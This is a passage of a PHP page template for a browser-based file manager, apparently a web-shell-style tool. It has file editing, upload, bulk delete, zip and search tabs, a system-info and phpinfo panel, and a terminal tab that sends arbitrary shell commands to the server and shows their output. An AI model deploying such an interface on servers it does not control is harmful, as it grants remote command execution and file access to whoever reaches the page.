  <div class="tab <?=$active_tab==='terminal'?'active':''?>" onclick="switchTab('terminal')"><i class="fa-solid fa-terminal"></i> <?=$t['tab_terminal']?></div>
  <div class="tab tab-tools <?=$active_tab==='tools'?'active':''?>" onclick="switchTab('tools')"><i class="fa-solid fa-screwdriver-wrench"></i> <?=$t['tab_tools']?></div>
</div>

<!-- TAB: FILES -->
<div id="tab-files" class="tab-content <?=$active_tab==='files'?'active':''?>">
  <?php if($edit_file):?>
  <div class="editor-banner">
    <i class="fa-solid fa-file-code"></i>
    <span><?=$t['editing']?>: <strong style="color:var(--v3)"><?=htmlspecialchars($edit_file)?></strong></span>
    <a href="?dir=<?=$eDir?>&tab=files<?=$lp?>"><i class="fa-solid fa-xmark"></i> <?=$t['close_editor']?></a>
  </div>
  <div class="panel">
    <div class="panel-hdr"><div class="panel-hdr-icon"><i class="fa-solid fa-file-code"></i></div><div class="panel-hdr-title">Editor<span class="panel-hdr-name">— <?=htmlspecialchars($edit_file)?></span></div></div>
    <div class="panel-body">
      <div class="editor-meta">
        <span><i class="fa-solid fa-file"></i> <?=htmlspecialchars($edit_file)?></span>
        <span><i class="fa-solid fa-weight-hanging"></i> <?=$edit_size?></span>
        <span><i class="fa-solid fa-code"></i> <?=strtoupper($edit_ext)?:' — '?></span>
        <span><i class="fa-regular fa-clock"></i> <?=$edit_mtime?></span>
        <span><i class="fa-solid fa-align-left"></i> <?=substr_count($edit_content,"\n")+1?> <?=$t['lines']?></span>
      </div>
      <form method="post" action="?dir=<?=$eDir?>&tab=files<?=$lp?>" id="editorForm">
        <input type="hidden" name="file_name" value="<?=htmlspecialchars($edit_file)?>">
        <textarea name="file_content" class="field" id="editorArea" onkeydown="editorTab(event)"><?=htmlspecialchars($edit_content)?></textarea>
        <div style="margin-top:10px;display:flex;gap:8px;flex-wrap:wrap;align-items:center">
          <button type="submit" name="save_file" class="btn btn-save"><i class="fa-solid fa-floppy-disk"></i> <?=$t['save']?></button>
          <a href="?dir=<?=$eDir?>&download=<?=urlencode($edit_file)?><?=$lp?>" class="btn btn-c"><i class="fa-solid fa-download"></i> <?=$t['download']?></a>
          <a href="?dir=<?=$eDir?>&tab=files<?=$lp?>" class="btn btn-ghost"><i class="fa-solid fa-xmark"></i> <?=$t['close']?></a>
          <span style="font-size:.68rem;color:var(--mute);margin-left:auto"><i class="fa-solid fa-keyboard"></i> <?=$t['tab_hint']?></span>
        </div>
      </form>
    </div>
  </div>
  <?php endif;?>
  <?php if($rename_file):?>
  <div class="panel">
    <div class="panel-hdr"><div class="panel-hdr-icon"><i class="fa-solid fa-pen"></i></div><div class="panel-hdr-title"><?=$t['rename_title']?><span class="panel-hdr-name">— <?=htmlspecialchars($rename_file)?></span></div></div>
    <div class="panel-body">
      <form method="post" action="?dir=<?=$eDir?>&tab=files<?=$lp?>" style="display:flex;gap:9px;flex-wrap:wrap;align-items:center">
        <input type="hidden" name="old_name" value="<?=htmlspecialchars($rename_file)?>">
        <input type="text" name="new_name" placeholder="<?=$t['new_name_ph']?>" class="field-sm" style="flex:1;min-width:180px" required autofocus>
        <button type="submit" name="rename_file" class="btn btn-v"><i class="fa-solid fa-check"></i> <?=$t['rename']?></button>
        <a href="?dir=<?=$eDir?>&tab=files<?=$lp?>" class="btn btn-ghost"><i class="fa-solid fa-xmark"></i> <?=$t['cancel']?></a>
      </form>
    </div>
  </div>
  <?php endif;?>
  <div class="bulk-bar" id="bulkBar">
    <i class="fa-solid fa-layer-group" style="color:var(--v2)"></i>
    <span id="bulkCount">0 <?=$t['bulk_selected']?></span>
    <button class="btn btn-r" onclick="bulkDelete()"><i class="fa-solid fa-trash"></i> <?=$t['bulk_delete']?></button>
    <button class="btn btn-o" onclick="openBulkZipModal()"><i class="fa-solid fa-file-zipper"></i> <?=$t['bulk_zip']?></button>
    <button class="btn btn-ghost" onclick="clearSelection()"><i class="fa-solid fa-xmark"></i> <?=$t['bulk_cancel']?></button>
  </div>
  <div class="tbl-wrap">
    <table>
      <thead>
        <tr>
          <th style="width:34px"><input type="checkbox" id="selectAll" class="row-cb" onclick="toggleSelectAll(this)" title="<?=$t['select_all']?>"></th>
          <th style="width:40%"><?=sort_link('name',$t['name'],'fa-solid fa-file',$sort_by,$current_dir,$sort_dir,$active_tab,$lp)?></th>
          <th style="width:10%"><?=sort_link('size',$t['size'],'fa-solid fa-weight-hanging',$sort_by,$current_dir,$sort_dir,$active_tab,$lp)?></th>
          <th style="width:15%"><?=sort_link('mtime',$t['modified'],'fa-regular fa-clock',$sort_by,$current_dir,$sort_dir,$active_tab,$lp)?></th>
          <th style="width:8%"><?=sort_link('perms',$t['mode'],'fa-solid fa-lock',$sort_by,$current_dir,$sort_dir,$active_tab,$lp)?></th>
          <th><i class="fa-solid fa-bolt" style="margin-right:4px;color:var(--b3)"></i> <?=$t['action']?></th>
        </tr>
      </thead>
      <tbody><?php listDirectory($current_dir,$sort_by,$sort_dir,$view_mode,$active_tab,$t,$lp);?></tbody>
    </table>
  </div>
</div>

<!-- TAB: UPLOAD -->
<div id="tab-upload" class="tab-content <?=$active_tab==='upload'?'active':''?>">
  <form method="post" enctype="multipart/form-data" action="?dir=<?=$eDir?>&tab=upload<?=$lp?>">
    <div class="panel">
      <div class="panel-hdr"><div class="panel-hdr-icon"><i class="fa-solid fa-cloud-arrow-up"></i></div><div class="panel-hdr-title"><?=$t['upload_title']?></div></div>
      <div class="panel-body">
        <div class="file-drop" id="fileDrop">
          <input type="file" name="files[]" id="fileInput" multiple onchange="handleFileChange(this)">
          <div class="file-drop-label"><i class="fa-solid fa-cloud-arrow-up"></i><span id="fileName"><?=$t['upload_hint']?></span></div>
        </div>
        <button type="submit" name="upload" class="btn btn-v"><i class="fa-solid fa-upload"></i> <?=$t['tab_upload']?></button>
        <div style="font-size:.7rem;color:var(--mute)"><i class="fa-solid fa-circle-info" style="color:var(--v2)"></i> <?=$t['upload_to']?>: <code style="color:var(--c2)"><?=htmlspecialchars($current_dir)?></code></div>
      </div>
    </div>
  </form>
</div>

<!-- TAB: CREATE -->
<div id="tab-create" class="tab-content <?=$active_tab==='create'?'active':''?>">
  <div class="panel">
    <div class="panel-hdr"><div class="panel-hdr-icon"><i class="fa-solid fa-plus"></i></div><div class="panel-hdr-title"><?=$t['create_title']?></div></div>
    <div class="panel-body">
      <form method="post" action="?dir=<?=$eDir?>&tab=create<?=$lp?>" style="display:flex;gap:9px;flex-wrap:wrap;align-items:center">
        <i class="fa-solid fa-file-circle-plus" style="color:var(--v2)"></i>
        <span style="font-size:.74rem;color:var(--dim);min-width:70px"><?=$t['new_file']?></span>
        <input type="text" name="new_file_name" placeholder="<?=$t['file_ph']?>" class="field-sm" style="flex:1">
        <button type="submit" name="create_file" class="btn btn-c"><i class="fa-solid fa-plus"></i> <?=$t['create_file']?></button>
      </form>
      <hr style="border-color:var(--b1);margin:2px 0">
      <form method="post" action="?dir=<?=$eDir?>&tab=create<?=$lp?>" style="display:flex;gap:9px;flex-wrap:wrap;align-items:center">
        <i class="fa-solid fa-folder-plus" style="color:var(--y)"></i>
        <span style="font-size:.74rem;color:var(--dim);min-width:70px"><?=$t['new_folder']?></span>
        <input type="text" name="new_folder_name" placeholder="<?=$t['folder_ph']?>" class="field-sm" style="flex:1">
        <button type="submit" name="create_folder" class="btn btn-c"><i class="fa-solid fa-plus"></i> <?=$t['create_folder']?></button>
      </form>
    </div>
  </div>
</div>

<!-- TAB: ZIP -->
<div id="tab-zip" class="tab-content <?=$active_tab==='zip'?'active':''?>">
  <div class="panel">
    <div class="panel-hdr"><div class="panel-hdr-icon"><i class="fa-solid fa-file-zipper"></i></div><div class="panel-hdr-title"><?=$t['zip_title']?></div></div>
    <div class="panel-body">
      <form method="post" action="?dir=<?=$eDir?>&tab=zip<?=$lp?>">
        <div style="display:flex;gap:9px;align-items:center;flex-wrap:wrap;margin-bottom:11px">
          <input type="text" name="zip_name" placeholder="<?=$t['zip_name_ph']?>" class="field-sm" style="flex:1">
          <button type="submit" name="create_zip" class="btn btn-v"><i class="fa-solid fa-file-zipper"></i> <?=$t['make_zip']?></button>
        </div>
        <div style="font-size:.72rem;color:var(--dim);margin-bottom:7px"><?=$t['select_files']?></div>
        <div style="max-height:260px;overflow-y:auto;background:var(--bg);border:1px solid var(--b2);border-radius:var(--rads);padding:9px;display:flex;flex-direction:column;gap:3px;">
          <?php
          $all_files_zip=array_filter(@scandir($current_dir)?:[], fn($f)=>$f!='.'&&$f!='..'&&is_file($current_dir.'/'.$f));
          if(empty($all_files_zip)) echo '<span style="font-size:.76rem;color:var(--mute)">'.$t['no_files'].'</span>';
          foreach($all_files_zip as $fz):[$ic,$col]=fa_icon($fz);?>
          <label style="display:flex;align-items:center;gap:7px;font-size:.76rem;cursor:pointer;padding:5px 7px;border-radius:var(--radp);transition:background .12s;" onmouseover="this.style.background='var(--s2)'" onmouseout="this.style.background=''">
            <input type="checkbox" name="zip_files[]" value="<?=htmlspecialchars($fz)?>" style="accent-color:var(--v)">
            <i class="<?=$ic?>" style="color:<?=$col?>"></i>
            <span style="flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap"><?=htmlspecialchars($fz)?></span>
            <span style="color:var(--mute);font-family:'Fira Code',monospace;font-size:.67rem"><?=fmt_size(filesize($current_dir.'/'.$fz))?></span>
          </label>
          <?php endforeach;?>
        </div>
      </form>
    </div>
  </div>
</div>

<!-- TAB: SEARCH -->
<div id="tab-search" class="tab-content <?=$active_tab==='search'?'active':''?>">
  <form method="post" action="?dir=<?=$eDir?>&tab=search<?=$lp?>">
    <div class="panel">
      <div class="panel-hdr"><div class="panel-hdr-icon"><i class="fa-solid fa-magnifying-glass"></i></div><div class="panel-hdr-title"><?=$t['search_title']?></div></div>
      <div class="panel-body">
        <div style="display:flex;gap:9px;flex-wrap:wrap;align-items:center">
          <input type="text" name="search_query" placeholder="<?=$t['search_ph']?>" value="<?=htmlspecialchars($search_query)?>" class="field-sm" style="flex:1">
          <button type="submit" name="search_files" class="btn btn-v"><i class="fa-solid fa-search"></i> <?=$t['search_btn']?></button>
          <?php if($search_query):?><a href="?dir=<?=$eDir?>&tab=search<?=$lp?>" class="btn btn-ghost"><i class="fa-solid fa-xmark"></i> <?=$t['search_reset']?></a><?php endif;?>
        </div>
        <div style="font-size:.7rem;color:var(--mute)"><i class="fa-solid fa-circle-info" style="color:var(--v2)"></i> <?=$t['search_in']?>: <code style="color:var(--c2)"><?=htmlspecialchars($current_dir)?></code></div>
        <?php if($search_query&&!empty($search_results)):?>
        <div style="font-size:.72rem;color:var(--c2)"><i class="fa-solid fa-check-circle"></i> <?=count($search_results)?> <?=$t['results_found']?></div>
        <div style="max-height:380px;overflow-y:auto;display:flex;flex-direction:column;gap:5px;">
          <?php foreach($search_results as $result):?>
          <div class="search-result-item" onclick="location='?dir=<?=urlencode(dirname($result['path']))?>&tab=files<?=$lp?>'">
            <i class="fa-solid <?=$result['is_dir']?'fa-folder':'fa-file'?>" style="color:<?=$result['is_dir']?'#ffd166':'var(--v2)'?>"></i>
            <div class="search-result-path"><?=htmlspecialchars($result['path'])?></div>
            <?php if(!$result['is_dir']&&$result['size']>0):?><span style="font-family:'Fira Code',monospace;font-size:.65rem;color:var(--mute);flex-shrink:0"><?=fmt_size($result['size'])?></span><?php endif;?>
            <div class="search-result-type"><?=$result['is_dir']?'DIR':'FILE'?></div>
          </div>
          <?php endforeach;?>
        </div>
        <?php elseif($search_query):?>
        <div style="font-size:.78rem;color:var(--mute);text-align:center;padding:22px"><i class="fa-solid fa-circle-xmark" style="margin-right:5px;color:var(--r)"></i><?=$t['no_results']?> "<?=htmlspecialchars($search_query)?>"</div>
        <?php endif;?>
      </div>
    </div>
  </form>
</div>

<!-- TAB: TERMINAL -->
<div id="tab-terminal" class="tab-content <?=$active_tab==='terminal'?'active':''?>">
  <div class="panel">
    <div class="panel-hdr"><div class="panel-hdr-icon"><i class="fa-solid fa-terminal"></i></div><div class="panel-hdr-title"><?=$t['terminal_title']?></div></div>
    <div class="panel-body">
      <div class="editor-meta">
        <span><i class="fa-solid fa-folder"></i> <?=htmlspecialchars($current_dir)?></span>
        <span><i class="fa-brands fa-php"></i> PHP <?=PHP_VERSION?></span>
        <?php
        $shell_disabled=(!function_exists('shell_exec')||in_array('shell_exec',array_map('trim',explode(',',ini_get('disable_functions')))));
        if($shell_disabled) echo '<span style="color:var(--r)"><i class="fa-solid fa-lock"></i> '.$t['shell_disabled'].'</span>';
        else echo '<span style="color:var(--g)"><i class="fa-solid fa-circle-check"></i> '.$t['shell_enabled'].'</span>';
        ?>
      </div>
      <form method="post" action="?dir=<?=$eDir?>&tab=terminal<?=$lp?>" id="termForm">
        <div style="display:flex;gap:9px;align-items:center">
          <span style="font-family:'Fira Code',monospace;font-size:.88rem;color:var(--g);flex-shrink:0">$</span>
          <input type="text" name="cmd_input" id="cmdInput" class="field-sm" placeholder="<?=$t['cmd_ph']?>" value="<?=htmlspecialchars($cmd_input_val)?>" autocomplete="off" spellcheck="false" style="flex:1">
          <button type="submit" name="run_cmd" class="btn btn-v"><i class="fa-solid fa-play"></i> <?=$t['run']?></button>
        </div>
      </form>
      <?php if($cmd_output!==''):?>
      <div class="terminal-wrap"><span class="tprompt">$ <?=htmlspecialchars($cmd_input_val)?></span><div class="tout"><?=htmlspecialchars($cmd_output)?></div></div>
      <?php else:?>
      <div style="font-size:.75rem;color:var(--mute);text-align:center;padding:18px;border:1px dashed var(--b2);border-radius:var(--rads)"><i class="fa-solid fa-terminal" style="margin-right:5px;color:var(--b3)"></i><?=$t['output_here']?></div>
      <?php endif;?>
      <div style="font-size:.68rem;color:var(--mute)"><i class="fa-solid fa-triangle-exclamation" style="color:var(--y)"></i> <?=$t['terminal_warn']?></div>
    </div>
  </div>
</div>

<!-- TAB: TOOLS -->
<div id="tab-tools" class="tab-content <?=$active_tab==='tools'?'active':''?>">

  <!-- TOOLS GRID -->
  <div class="tools-grid">
    <div class="tool-card" onclick="toggleToolPanel('tool-sysinfo')">
      <div class="tool-card-header">
        <div class="tool-card-icon" style="background:rgba(124,92,252,.15);color:var(--v2)"><i class="fa-solid fa-server"></i></div>
        <div class="tool-card-title"><?=$t['tool_sysinfo']?></div>
      </div>
      <div class="tool-card-desc"><?=$t['tool_sysinfo_desc']?></div>
    </div>
    <div class="tool-card" onclick="toggleToolPanel('tool-hash')">
      <div class="tool-card-header">
        <div class="tool-card-icon" style="background:rgba(0,245,196,.12);color:var(--c)"><i class="fa-solid fa-hashtag"></i></div>
        <div class="tool-card-title"><?=$t['tool_hash']?></div>
      </div>
      <div class="tool-card-desc"><?=$t['tool_hash_desc']?></div>
    </div>
    <div class="tool-card" onclick="toggleToolPanel('tool-base64')">
      <div class="tool-card-header">
        <div class="tool-card-icon" style="background:rgba(255,209,102,.12);color:var(--y)"><i class="fa-solid fa-code"></i></div>
        <div class="tool-card-title"><?=$t['tool_base64']?></div>
      </div>
      <div class="tool-card-desc"><?=$t['tool_base64_desc']?></div>
    </div>
    <div class="tool-card" onclick="toggleToolPanel('tool-chmod')">
      <div class="tool-card-header">
        <div class="tool-card-icon" style="background:rgba(255,152,0,.12);color:var(--o)"><i class="fa-solid fa-lock"></i></div>
        <div class="tool-card-title"><?=$t['tool_chmod']?></div>
      </div>
      <div class="tool-card-desc"><?=$t['tool_chmod_desc']?></div>
    </div>
    <div class="tool-card" onclick="toggleToolPanel('tool-json')">
      <div class="tool-card-header">
        <div class="tool-card-icon" style="background:rgba(57,255,126,.12);color:var(--g)"><i class="fa-solid fa-brackets-curly"></i></div>
        <div class="tool-card-title"><?=$t['tool_json']?></div>
      </div>
      <div class="tool-card-desc"><?=$t['tool_json_desc']?></div>
    </div>
    <div class="tool-card" onclick="toggleToolPanel('tool-regex')">
      <div class="tool-card-header">
        <div class="tool-card-icon" style="background:rgba(255,77,141,.12);color:var(--pk2)"><i class="fa-solid fa-magnifying-glass-plus"></i></div>
        <div class="tool-card-title"><?=$t['tool_regex']?></div>
      </div>
      <div class="tool-card-desc"><?=$t['tool_regex_desc']?></div>
    </div>
    <div class="tool-card" onclick="toggleToolPanel('tool-htpasswd')">
      <div class="tool-card-header">
        <div class="tool-card-icon" style="background:rgba(86,204,242,.12);color:#56ccf2"><i class="fa-solid fa-key"></i></div>
        <div class="tool-card-title"><?=$t['tool_htpasswd']?></div>
      </div>
      <div class="tool-card-desc"><?=$t['tool_htpasswd_desc']?></div>
    </div>
    <div class="tool-card" onclick="toggleToolPanel('tool-imgconv')">
      <div class="tool-card-header">
        <div class="tool-card-icon" style="background:rgba(171,71,188,.12);color:#ce93d8"><i class="fa-solid fa-image"></i></div>
        <div class="tool-card-title"><?=$t['tool_imgcomp']?></div>
      </div>
      <div class="tool-card-desc"><?=$t['tool_imgcomp_desc']?></div>
    </div>
    <div class="tool-card" onclick="toggleToolPanel('tool-phpinfo')">
      <div class="tool-card-header">
        <div class="tool-card-icon" style="background:rgba(137,146,191,.12);color:#8892bf"><i class="fa-brands fa-php"></i></div>
        <div class="tool-card-title"><?=$t['tool_phpinfo']?></div>
      </div>
      <div class="tool-card-desc"><?=$t['tool_phpinfo_desc']?></div>
    </div>
    <div class="tool-card" onclick="toggleToolPanel('tool-cron')">
      <div class="tool-card-header">
        <div class="tool-card-icon" style="background:rgba(255,61,107,.12);color:var(--r)"><i class="fa-solid fa-clock-rotate-left"></i></div>
        <div class="tool-card-title"><?=$t['tool_cron']?></div>
      </div>
      <div class="tool-card-desc"><?=$t['tool_cron_desc']?></div>
    </div>
    <div class="tool-card" onclick="toggleToolPanel('tool-uuid')">
      <div class="tool-card-header">
        <div class="tool-card-icon" style="background:rgba(138,43,226,.12);color:#8a2be2"><i class="fa-solid fa-fingerprint"></i></div>
        <div class="tool-card-title"><?=$t['tool_uuid']?></div>
      </div>
      <div class="tool-card-desc"><?=$t['tool_uuid_desc']?></div>
    </div>
    <div class="tool-card" onclick="toggleToolPanel('tool-urlenc')">
      <div class="tool-card-header">
        <div class="tool-card-icon" style="background:rgba(255,140,0,.12);color:#ff8c00"><i class="fa-solid fa-link"></i></div>
        <div class="tool-card-title"><?=$t['tool_urlenc']?></div>
      </div>
      <div class="tool-card-desc"><?=$t['tool_urlenc_desc']?></div>
    </div>
    <div class="tool-card" onclick="toggleToolPanel('tool-textstats')">
      <div class="tool-card-header">
        <div class="tool-card-icon" style="background:rgba(50,205,50,.12);color:#32cd32"><i class="fa-solid fa-rectangle-list"></i></div>
        <div class="tool-card-title"><?=$t['tool_textstats']?></div>
      </div>
      <div class="tool-card-desc"><?=$t['tool_textstats_desc']?></div>
    </div>
    <div class="tool-card" onclick="toggleToolPanel('tool-passgen')">
      <div class="tool-card-header">
        <div class="tool-card-icon" style="background:rgba(220,20,60,.12);color:#dc143c"><i class="fa-solid fa-shield-halved"></i></div>
        <div class="tool-card-title"><?=$t['tool_passgen']?></div>
      </div>
      <div class="tool-card-desc"><?=$t['tool_passgen_desc']?></div>
    </div>
    <div class="tool-card" onclick="toggleToolPanel('tool-timestamp')">
      <div class="tool-card-header">
        <div class="tool-card-icon" style="background:rgba(30,144,255,.12);color:#1e90ff"><i class="fa-solid fa-calendar-days"></i></div>
        <div class="tool-card-title"><?=$t['tool_timestamp']?></div>
      </div>
      <div class="tool-card-desc"><?=$t['tool_timestamp_desc']?></div>
    </div>
  </div>

  <!-- TOOL: SYSTEM INFO -->
  <div id="tool-sysinfo" class="tool-panel">
    <div class="tool-section">
      <div class="tool-section-hdr"><div class="panel-hdr-icon"><i class="fa-solid fa-server"></i></div><span class="panel-hdr-title"><?=$t['tool_sysinfo']?></span></div>
      <div class="tool-section-body">
        <table class="sysinfo-table">
          <?php foreach($sys_info as $k=>$v):?>
          <tr><td><?=htmlspecialchars(ucwords(str_replace('_',' ',$k)))?></td><td><?=htmlspecialchars($v)?></td></tr>
          <?php endforeach;?>
          <tr><td>PHP Extensions</td><td><details><summary style="cursor:pointer;color:var(--v2)"><?=count(get_loaded_extensions())?> loaded</summary><div style="margin-top:7px;font-size:.72rem;line-height:1.8"><?=implode(', ',get_loaded_extensions())?></div></details></td></tr>
        </table>
      </div>
    </div>
  </div>

  <!-- TOOL: HASH GENERATOR -->
  <div id="tool-hash" class="tool-panel">
    <div class="tool-section">
      <div class="tool-section-hdr"><div class="panel-hdr-icon"><i class="fa-solid fa-hashtag"></i></div><span class="panel-hdr-title"><?=$t['tool_hash']?></span></div>
      <div class="tool-section-body">
        <div class="tool-row">
          <span class="tool-label"><?=$t['hash_text']?></span>
          <input type="text" id="hashInput" class="field-sm" style="flex:1" placeholder="Enter text to hash...">
          <button class="btn btn-v" onclick="doHash()"><i class="fa-solid fa-hashtag"></i> <?=$t['generate']?></button>
        </div>
        <div id="hashResult" style="display:none;display:flex;flex-direction:column;gap:7px">
          <?php foreach(['md5'=>'MD5','sha1'=>'SHA1','sha256'=>'SHA256','sha512'=>'SHA512'] as $hk=>$hl):?>
          <div>
            <div style="font-size:.65rem;color:var(--dim);margin-bottom:3px;display:flex;align-items:center;gap:6px"><?=$hl?> <button class="copy-btn" onclick="copyText('hash-<?=$hk?>')">copy</button></div>
            <div class="tool-result" id="hash-<?=$hk?>">—</div>
          </div>
          <?php endforeach;?>
        </div>
      </div>
    </div>
  </div>

  <!-- TOOL: BASE64 -->
  <div id="tool-base64" class="tool-panel">
    <div class="tool-section">
      <div class="tool-section-hdr"><div class="panel-hdr-icon"><i class="fa-solid fa-code"></i></div><span class="panel-hdr-title"><?=$t['tool_base64']?></span></div>
      <div class="tool-section-body">
        <div>
          <div style="font-size:.72rem;color:var(--dim);margin-bottom:5px"><?=$t['input']?></div>
          <textarea id="b64Input" class="field" style="height:100px"placeholder="Enter text or Base64..."></textarea>
        </div>
        <div style="display:flex;gap:8px;flex-wrap:wrap">
          <button class="btn btn-v" onclick="doB64('enc')"><i class="fa-solid fa-lock"></i> <?=$t['encode']?></button>
          <button class="btn btn-c" onclick="doB64('dec')"><i class="fa-solid fa-unlock"></i> <?=$t['decode']?></button>
          <button class="btn btn-ghost" onclick="copyText('b64Output')">Copy <?=$t['output']?></button>
          <button class="btn btn-ghost" style="margin-left:auto" onclick="document.getElementById('b64Input').value='';document.getElementById('b64Output').textContent='—'">Clear</button>
        </div>
        <div>
          <div style="font-size:.72rem;color:var(--dim);margin-bottom:5px;display:flex;align-items:center;gap:7px"><?=$t['output']?> <button class="copy-btn" onclick="copyText('b64Output')">copy</button></div>
          <div class="tool-result" id="b64Output">—</div>
        </div>
      </div>
    </div>
  </div>

  <!-- TOOL: CHMOD CALC -->
  <div id="tool-chmod" class="tool-panel">
    <div class="tool-section">
      <div class="tool-section-hdr"><div class="panel-hdr-icon"><i class="fa-solid fa-lock"></i></div><span class="panel-hdr-title"><?=$t['tool_chmod']?></span></div>
      <div class="tool-section-body">
        <div class="chmod-grid">
          <?php foreach(['Owner','Group','Other'] as $grp):$pfx=strtolower(substr($grp,0,1));?>
          <div class="chmod-group">
            <div class="chmod-group-title"><?=$grp?></div>
            <div class="chmod-cb-row">
              <label class="chmod-cb-item"><input type="checkbox" class="chmod-cb" data-val="4" data-grp="<?=$pfx?>" onchange="calcChmod()"> Read (r)</label>
              <label class="chmod-cb-item"><input type="checkbox" class="chmod-cb" data-val="2" data-grp="<?=$pfx?>" onchange="calcChmod()"> Write (w)</label>
              <label class="chmod-cb-item"><input type="checkbox" class="chmod-cb" data-val="1" data-grp="<?=$pfx?>" onchange="calcChmod()"> Execute (x)</label>
            </div>
          </div>
          <?php endforeach;?>
        </div>
        <div class="chmod-result-big" id="chmodResult">000</div>
        <div style="display:flex;gap:7px;flex-wrap:wrap">
          <?php foreach(['755'=>'755 (rwxr-xr-x)','644'=>'644 (rw-r--r--)','777'=>'777 (rwxrwxrwx)','600'=>'600 (rw-------)','444'=>'444 (r--r--r--)'] as $v=>$l):?>
          <button class="btn btn-ghost" style="font-size:.72rem" onclick="setChmod('<?=$v?>')"><?=$l?></button>
          <?php endforeach;?>
        </div>
      </div>
    </div>
  </div>

  <!-- TOOL: JSON FORMATTER -->
  <div id="tool-json" class="tool-panel">
    <div class="tool-section">
      <div class="tool-section-hdr"><div class="panel-hdr-icon"><i class="fa-solid fa-brackets-curly"></i></div><span class="panel-hdr-title"><?=$t['tool_json']?></span></div>
      <div class="tool-section-body">
        <div>
          <div style="font-size:.72rem;color:var(--dim);margin-bottom:5px"><?=$t['input']?> (raw JSON)</div>
          <textarea id="jsonInput" class="field" style="height:120px" placeholder='{"key":"value","arr":[1,2,3]}'></textarea>
        </div>
        <div style="display:flex;gap:8px;flex-wrap:wrap">
          <button class="btn btn-v" onclick="doJson('format')"><i class="fa-solid fa-align-left"></i> <?=$t['format']?></button>
          <button class="btn btn-c" onclick="doJson('minify')"><i class="fa-solid fa-compress"></i> Minify</button>
          <button class="btn btn-ghost" onclick="copyText('jsonOutput')">Copy</button>
        </div>
        <div>
          <div id="jsonStatus" style="font-size:.72rem;margin-bottom:5px"></div>
          <div class="tool-result" id="jsonOutput">—</div>
        </div>
      </div>
    </div>
  </div>

  <!-- TOOL: REGEX TESTER -->
  <div id="tool-regex" class="tool-panel">
    <div class="tool-section">
      <div class="tool-section-hdr"><div class="panel-hdr-icon"><i class="fa-solid fa-magnifying-glass-plus"></i></div><span class="panel-hdr-title"><?=$t['tool_regex']?></span></div>
      <div class="tool-section-body">
        <div class="tool-row">
          <span class="tool-label"><?=$t['pattern']?></span>
          <input type="text" id="regexPattern" class="field-sm" style="flex:1" placeholder="/pattern/i">
        </div>
        <div class="tool-row">
          <span class="tool-label"><?=$t['subject']?></span>
          <input type="text" id="regexSubject" class="field-sm" style="flex:1" placeholder="Test string here...">
        </div>
        <button class="btn btn-v" onclick="doRegex()"><i class="fa-solid fa-play"></i> <?=$t['test']?></button>
        <div id="regexResult" class="tool-result">—</div>
      </div>
    </div>
  </div>

  <!-- TOOL: HTPASSWD -->
  <div id="tool-htpasswd" class="tool-panel">
    <div class="tool-section">
      <div class="tool-section-hdr"><div class="panel-hdr-icon"><i class="fa-solid fa-key"></i></div><span class="panel-hdr-title"><?=$t['tool_htpasswd']?></span></div>
      <div class="tool-section-body">
        <div class="tool-row">
          <span class="tool-label">Username</span>
          <input type="text" id="htUser" class="field-sm" style="flex:1" placeholder="admin">
        </div>
        <div class="tool-row">
          <span class="tool-label">Password</span>
          <input type="password" id="htPass" class="field-sm" style="flex:1" placeholder="••••••••">
          <button class="btn btn-ghost" onclick="toggleHtPass()"><i class="fa-solid fa-eye" id="htEyeIcon"></i></button>
        </div>
        <button class="btn btn-v" onclick="doHtpasswd()"><i class="fa-solid fa-key"></i> <?=$t['generate']?></button>
        <div>
          <div style="font-size:.72rem;color:var(--dim);margin-bottom:5px;display:flex;align-items:center;gap:7px">
            <?=$t['result']?> <button class="copy-btn" onclick="copyText('htResult')">copy</button>
          </div>
          <div class="tool-result" id="htResult">—</div>
        </div>
        <div style="font-size:.7rem;color:var(--mute)"><i class="fa-solid fa-circle-info" style="color:var(--v2)"></i>
          <?=$lang==='id'?'Hasil dapat langsung di-paste ke file .htpasswd':'Result can be pasted directly into your .htpasswd file'?>
        </div>
      </div>
    </div>
  </div>

  <!-- TOOL: IMAGE CONVERTER -->
  <div id="tool-imgconv" class="tool-panel">
    <div class="tool-section">
      <div class="tool-section-hdr"><div class="panel-hdr-icon"><i class="fa-solid fa-image"></i></div><span class="panel-hdr-title"><?=$t['tool_imgcomp']?></span></div>
      <div class="tool-section-body">
        <?php if(!function_exists('imagecreatefromstring')):?>
        <div style="color:var(--r);font-size:.78rem"><i class="fa-solid fa-triangle-exclamation"></i> GD extension not available on this server.</div>
        <?php else:?>
        <form id="imgConvForm" onsubmit="doImgConv(event)">
          <div style="display:flex;flex-direction:column;gap:10px">
            <div class="tool-row">
              <span class="tool-label"><?=$t['select_image']?></span>
              <input type="file" id="imgFile" class="field-sm" accept="image/*" style="flex:1">
            </div>
            <div class="tool-row">
              <span class="tool-label"><?=$lang==='id'?'Format output':'Output format'?></span>
              <select id="imgFmt" class="field-sm" style="flex:none;width:120px">
                <option value="png">PNG</option>
                <option value="jpg">JPEG</option>
                <option value="webp">WebP</option>
                <option value="gif">GIF</option>
              </select>
              <span class="tool-label" style="min-width:60px"><?=$t['img_quality']?></span>
              <input type="number" id="imgQuality" class="field-sm" style="flex:none;width:70px" value="85" min="1" max="100">
            </div>
            <div class="tool-row">
              <span class="tool-label"><?=$t['resize_width']?></span>
              <input type="number" id="imgW" class="field-sm" style="flex:1" placeholder="0 = auto">
              <span class="tool-label" style="min-width:60px"><?=$t['resize_height']?></span>
              <input type="number" id="imgH" class="field-sm" style="flex:1" placeholder="0 = auto">
            </div>
            <button type="submit" class="btn btn-v"><i class="fa-solid fa-image"></i> <?=$t['convert']?></button>
          </div>
        </form>
        <div id="imgConvResult" style="display:none">
          <div style="font-size:.72rem;color:var(--dim);margin-bottom:7px" id="imgConvInfo"></div>
          <img id="imgConvPreview" style="max-width:100%;border:1px solid var(--b2);border-radius:var(--rads)">
          <div style="margin-top:8px"><a id="imgConvDownload" class="btn btn-c" download><i class="fa-solid fa-download"></i> Download</a></div>
        </div>
        <?php endif;?>
      </div>
    </div>
  </div>

  <!-- TOOL: PHP INFO -->
  <div id="tool-phpinfo" class="tool-panel">
    <div class="tool-section">
      <div class="tool-section-hdr"><div class="panel-hdr-icon"><i class="fa-brands fa-php"></i></div><span class="panel-hdr-title"><?=$t['tool_phpinfo']?></span></div>
      <div class="tool-section-body">
        <div style="font-size:.78rem;color:var(--dim)"><?=$lang==='id'?'PHP Info akan ditampilkan di tab/jendela baru.':'PHP Info will open in a new tab/window.'?></div>
